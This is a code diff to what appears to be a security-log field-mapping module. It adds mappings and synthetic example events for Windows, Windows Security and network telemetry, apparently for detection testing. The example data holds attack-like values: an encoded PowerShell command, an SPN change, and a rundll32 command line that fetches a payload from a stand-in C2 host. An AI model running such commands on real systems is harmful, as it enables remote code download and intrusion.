@@ -96,6 +96,13 @@ WINDOWS_FIELD_MAPPINGS = [
     ("Destination IP",       "$.DestinationIp",     33),
     ("Destination Port",     "$.DestinationPort",   34),
     ("Host Name (Server)",   "$.Computer",          35),
+    ("Source IP",            "$.SourceIp",          36),
+    ("Action",               "$.Action",            37),
+    ("Threat Name",          "$.ThreatName",        38),
+    ("Properties",           "$.Properties",        39),
+    ("Event Type",           "$.EventType",         40),
+    ("User Name",            "$.User",              41),
+    ("Account Name",         "$.User",              42),
 ]
 WINDOWS_EXAMPLE = {
     "EventID": 1,
@@ -118,6 +125,11 @@ WINDOWS_EXAMPLE = {
     "ParentCommandLine": "cmd.exe /c powershell.exe -enc SQBFAFgA",
     "ParentProcessGuid": "{FFEEDDCC-AAAA-BBBB-CCCC-DDDDEEEEFFFF}",
     "ParentProcessId": 1024,
+    "SourceIp": "10.0.1.25",
+    "Action": "Detected",
+    "ThreatName": "Synthetic Sentinel Threat",
+    "Properties": "Synthetic Sentinel properties",
+    "EventType": "ProcessCreate",
     "OriginalFileName": "powershell.exe",
     "Company": "Microsoft Corporation",
     "Product": "Microsoft Windows Operating System",
@@ -313,6 +325,10 @@ WINSEC_FIELD_MAPPINGS = [
     ("Share Name",              "$.ShareName",             30),
     ("Relative Target Name",    "$.RelativeTargetName",    31),
     ("Service File Name",       "$.ServiceFileName",       32),
+    # EventData-derived directory-service fields used by Sentinel MAP-05.
+    ("Target Object",           "$.EventData.ObjectDN",    33),
+    ("Target Object",           "$.EventData.ObjectName",  34),
+    ("Object Type",             "$.EventData.AttributeLDAPDisplayName", 35),
 ]
 WINSEC_EXAMPLE = {
     "EventID": "4769",
@@ -331,6 +347,11 @@ WINSEC_EXAMPLE = {
     "TargetServerName": "sql01.sevenkingdoms.local",
     "ServiceInformation": "MSSQLSvc/sql01.sevenkingdoms.local",
     "ObjectName": "\\\\DC01\\C$\\Windows\\Temp\\payload.exe",
+    "EventData": {
+        "ObjectDN": "CN=Admin,CN=Users,DC=sevenkingdoms,DC=local",
+        "ObjectName": "CN=Admin,CN=Users,DC=sevenkingdoms,DC=local",
+        "AttributeLDAPDisplayName": "servicePrincipalName",
+    },
     "AccessMask": "0x12019f",
     "FailureReason": "0xC000006D",
     "Status": "0xC000006D",
@@ -615,6 +636,9 @@ SYSNET_FIELD_MAPPINGS = [
     ("Technique ID",         "$.TechniqueId",       17),
     ("Account Name",         "$.AccountName",       18),
     ("Event Channel",        "$.Channel",           19),
+    ("Command Line",         "$.CommandLine",       20),
+    ("Parent Process Name",  "$.ParentImage",       21),
+    ("Request URL",          "$.RequestUrl",        22),
 ]
 SYSNET_EXAMPLE = {
     "@timestamp": "2026-02-11T10:30:00.000Z",
@@ -629,6 +653,9 @@ SYSNET_EXAMPLE = {
     "DestinationHostname": "evil-c2.example.com",
     "SourceIp": "10.0.1.50",
     "SourcePort": 54321,
+    "CommandLine": "rundll32.exe url.dll,FileProtocolHandler http://example-c2.invalid/payload",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "RequestUrl": "http://example-c2.invalid/payload",
     "Initiated": "true",
     "RuleName": "technique_id=T1071,technique_name=Application Layer Protocol",
     "TechniqueName": "Application Layer Protocol",
